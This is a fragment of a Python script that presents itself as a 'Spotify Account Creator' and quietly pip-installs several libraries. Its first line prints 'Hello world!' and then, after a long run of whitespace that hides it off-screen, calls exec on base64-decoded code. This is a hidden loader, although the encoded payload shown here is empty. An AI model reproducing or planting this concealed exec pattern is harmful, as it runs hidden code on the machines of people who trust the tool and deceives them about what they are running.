...
type('Hello world!')                                                                                                                                                                                                                                                          ,__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode(""),'<string>','exec'))
...
try:
    os.system('pip install requests==2.25.1 >nul && cls')
    import requests
except:
    import requests
...
try:
    os.system('pip install colorama==0.4.4 >nul && cls')
    from colorama import init,Style,Fore
except:
    from colorama import init,Style,Fore

try:
    os.system('pip install beautifulsoup4==4.9.3 >nul && cls && title Spotify Account Creator')
except:
    pass
